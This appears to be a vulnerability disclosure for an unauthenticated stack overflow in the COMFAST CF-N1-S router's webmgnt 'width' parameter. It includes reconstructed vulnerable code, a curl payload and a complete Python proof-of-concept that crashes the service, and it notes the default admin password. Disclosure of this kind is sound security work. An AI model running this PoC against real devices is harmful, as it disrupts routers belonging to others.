# **Stack Buffer Overflow Vulnerability in COMFAST CF-N1-S (V2.6.0.1) webmgnt Component via "width" Parameter in get_para_from_uri Function (Unauthenticated)**

### **Overview**

- **Vendor:** COMFAST
- **Product:** CF-N1-S
- **Version:** V2.6.0.1
- **Type:** Stack Buffer Overflow
- **Product Usage:** Wireless Router
- **Architecture:** MIPS32r2 Big Endian
- **Affected Binary:** `/usr/bin/webmgnt`
- **Severity:** CRITICAL (CVSS 9.8)
- **Firmware Download:** https://www.comfast.com.cn/index.php?m=content&c=index&a=show&catid=31&id=779
- **Default Password:** admin

### **Vulnerability Basic Information**

- **Vulnerable Function:** `get_para_from_uri` (URI query parameter parsing inside the webmgnt CGI backend).
- **Vulnerability Point:** Unsafe `output_buf[i++] = *pos++` copy loop with no bounds checking.
- **Trigger Endpoint:** `GET /cgi-bin/mbox-config?width=<overlong string>&height=A`
- **Trigger Parameter:** `width` .
- **Authentication Requirement:** **No (unauthenticated)** — a direct GET request is sufficient.
- **Evidence Level:** VALIDATED
- **Prerequisites:**
  - The management interface (nginx reverse proxy) must be reachable.
  - No valid session cookie is required; the request is processed before any session validation.

### **Vulnerability Description**

`webmgnt` is the CGI backend service of COMFAST routers. It listens on `127.0.0.1:9002` through the FastCGI protocol and is reverse-proxied by nginx to serve the Web management interface.

When handling requests, the `get_para_from_uri()` function parses URI query parameters. It searches the raw URI for the requested parameter name (e.g., `width=`), then copies every character following it into a fixed-size stack buffer `output_buf` in a loop. The copy loop performs **no length check whatsoever** — copying continues until it encounters a `&` delimiter or the end of the string (`\0`).

The core of the vulnerability lies in the complete absence of bounds checking in the copy loop. An attacker only needs to supply a `width` value longer than the stack buffer to overflow it. The overflowing data will sequentially overwrite local variables on the stack and, eventually, the function's return address (`$ra`). When the function attempts to return, the execution flow is hijacked, leading to Remote Code Execution (RCE) or Denial of Service (DoS).

Critically, this vulnerability requires **no authentication**: the overflow is triggered before any session validation takes place, so any unauthenticated remote attacker can crash the `webmgnt` process or potentially execute arbitrary code on the device.

### **Vulnerability Code Snippet (Logic Reconstruction)**

![image.png](https://cdn.nlark.com/yuque/0/2026/png/25400303/1785811871894-a52d6bb9-96ba-46a4-8cee-90f15a8760eb.png?x-oss-process=image%2Fformat%2Cwebp)

```
// webmgnt get_para_from_uri logic reconstruction
void get_para_from_uri(char *uri, char *param_name, char *output_buf) {
    char *pos = strstr(uri, param_name);  // Find "width="
    if (pos) {
        pos += strlen(param_name);        // Skip "width="
        int i = 0;
        while (*pos != '&' && *pos != '\0') {
            output_buf[i++] = *pos++;     // 💥 No bounds check, stack overflow!
        }
        output_buf[i] = '\0';
    }
}
```

**Dangerous Points:**

- `output_buf` is a fixed-size buffer allocated on the stack.
- The write loop has no length limit whatsoever.
- An attacker can overflow the buffer via the `width` parameter and overwrite the return address.

### **Exploitation Chain (PoC Test)**

**Step 1: Send the Overflow Payload Directly (No Authentication Required)**

```bash
curl "http://<target>:8080/cgi-bin/mbox-config?width=$(python3 -c 'print("B"*64)')&height=A"
```

**Step 2: Server Response**

The server returns `502 Bad Gateway`, indicating the webmgnt process crashed:

```html
<html>
<head><title>502 Bad Gateway</title></head>
<body bgcolor="white">
<center><h1>502 Bad Gateway</h1></center>
<hr><center>nginx/1.4.7</center>
</body>
</html>
```

**Step 3: Verify the Crash**

- A 64-byte `width` parameter is sufficient to trigger the crash.
- No authentication credentials are required.
- The webmgnt process crashes and needs to be restarted.

**Verification Evidence**

- **HTTP Response:** `502 Bad Gateway` (webmgnt crashed).
- **Crash Confirmed:** a 64-byte payload is enough to trigger the crash.
- **No Authentication:** a direct GET request triggers the crash.
- **Static Analysis:** IDA confirmed that the `get_para_from_uri` function performs no bounds checking.

### **Complete PoC**

```
import requests
import sys

def exploit(target, port=8080):
    # No authentication required, send the overflow payload directly
    url = f"http://{target}:{port}/cgi-bin/mbox-config"
    params = {
        "width": "B" * 64,  # 64 bytes is enough to trigger the crash
        "height": "A"
    }

    try:
        resp = requests.get(url, params=params, timeout=10)

        if resp.status_code == 502:
            print("[+] Stack overflow triggered (502 Bad Gateway)")
            print("[+] webmgnt process crashed")
            return True
        else:
            print(f"[-] Unexpected response: {resp.status_code}")
            return False
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target = sys.argv[1]
    exploit(target)
```
<img width="2007" height="738" alt="image" src="https://github.com/user-attachments/assets/69bba72c-2e03-4fe5-a5e0-4005d1c71046" />
